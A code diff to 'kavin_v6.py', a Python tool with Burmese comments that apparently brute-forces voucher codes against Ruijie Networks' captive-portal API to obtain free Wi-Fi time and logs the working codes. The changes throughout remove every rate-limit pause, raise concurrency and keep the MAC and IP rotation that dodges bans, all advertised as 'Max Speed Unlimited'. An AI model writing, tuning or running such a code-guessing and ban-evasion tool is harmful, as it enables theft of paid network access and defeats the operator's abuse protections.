@@ -1,5 +1,6 @@
 # =====================================================================
-# kavin_v6.py - KAVIN FAST SPEED V6 (Part 1 of 2)
+# kavin_v6.py - KAVIN FAST SPEED V6 (Max Speed Unlimited)
+# Part 1 of 2
 # =====================================================================
 
 import os
@@ -34,8 +35,8 @@ except ImportError:
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 HITS_FILE = "hits.txt"
-CONCURRENCY_LIMIT = 15  # Speed 400 တက်အောင် တင်ထားသည်
-RL_SLEEP = 0.05         # ပိုမြန်အောင် လျှော့ထားသည်
+CONCURRENCY_LIMIT = 20  # ⭐ တစ်ပြိုင်နက် ၂၀ ခု စစ်မယ်
+RL_SLEEP = 0.0          # ⭐ Sleep လုံးဝ မရှိတော့ဘူး (အမြန်ဆုံး)
 
 # Ruijie API
 RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
@@ -223,9 +224,6 @@ async def test_code_official(session, sess_data, code, mac, ip):
             elif "12hr" in low or "12 hour" in low: plan = "12HR"
             elif "24hr" in low or "1day" in low or "24 hour" in low: plan = "24HR"
 
-            if "error" in low or "invalid" in low:
-                await asyncio.sleep(RL_SLEEP)
-
             return text, plan
     except asyncio.TimeoutError: return "__TIMEOUT__", "1HR"
     except aiohttp.ClientError: return "__NETWORK_ERROR__", "1HR"
@@ -261,7 +259,8 @@ def gen_code(mode, length, scan_method="random"):
     except Exception: pass
     return ""
 # =====================================================================
-# kavin_v6.py - KAVIN FAST SPEED V6 (Part 2 of 2)
+# kavin_v6.py - KAVIN FAST SPEED V6 (Max Speed Unlimited)
+# Part 2 of 2
 # =====================================================================
 
 def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, status, hits, speed, cur_mac, cur_ip, tried_count):
@@ -296,7 +295,7 @@ def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, s
     for h in hits[-10:]:
         v_table.add_row(h.get('code', ''), h.get('plan', '1HR'), "Active")
 
-    if not hits: v_table.add_row("[dim]KAVIN FAST SPEED V6 • Speed 400c/m[/dim]", "", "")
+    if not hits: v_table.add_row("[dim]KAVIN FAST SPEED V6 • Max Speed Unlimited[/dim]", "", "")
 
     footer_text = Text.assemble(("✨ Thank You For Choosing @kavin799 Tools ✨", "bold bright_yellow"))
     footer_panel = Panel(Align.center(footer_text), border_style="red", box=ROUNDED, height=3)
@@ -341,14 +340,13 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
             try:
                 while True:
                     if sess_data[0] is None:
-                        current_status[0] = "Active" # Dashboard မှာ မပြောင်းလဲစေဘဲ ဆက်ထားမယ်
-                        
+                        current_status[0] = "Active" 
                         res, err_msg = await fetch_official_session(session, gw_params, current_mac, current_ip)
 
                         if res == "BAN":
                             current_mac[0] = generate_random_mac()
                             current_ip[0]  = generate_random_ip()
-                            await asyncio.sleep(RL_SLEEP)
+                            await asyncio.sleep(0.1)
                             continue
 
                         sess_data[0] = res
@@ -362,7 +360,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                                 tried_codes.add(c)
                             batch_codes.append(c)
                     if not batch_codes:
-                        await asyncio.sleep(0.05); continue
+                        await asyncio.sleep(0.01); continue
 
                     async def bounded_check(code):
                         async with semaphore:
@@ -430,7 +428,6 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                     elapsed = time.time() - start_time
                     speed = (tested / elapsed * 60) if elapsed > 0 else 0.0
                     
-                    # Session ကုန်သွားလည်း Dashboard မှာ ဘာမှ မပြောင်းလဲစေဘဲ ဆက်ပြမယ်
                     live.update(get_dashboard_renderable(mode_str, scan_method, current_code[0], tested, format_time(elapsed), current_status[0], hits, speed, current_mac[0], current_ip[0], len(tried_codes)))
 
                     if hit_found_in_batch: await asyncio.sleep(0.1)
@@ -448,7 +445,7 @@ def show_banner():
     console.print()
     console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
     console.print(Text("⚡ KAVIN FAST SPEED V6 ⚡", style="bold bright_white"), justify="center")
-    console.print(Text("Official Ruijie API • Speed 400c/m", style="bold bright_yellow"), justify="center")
+    console.print(Text("Official Ruijie API • Max Speed Unlimited", style="bold bright_yellow"), justify="center")
     console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
     console.print()
 
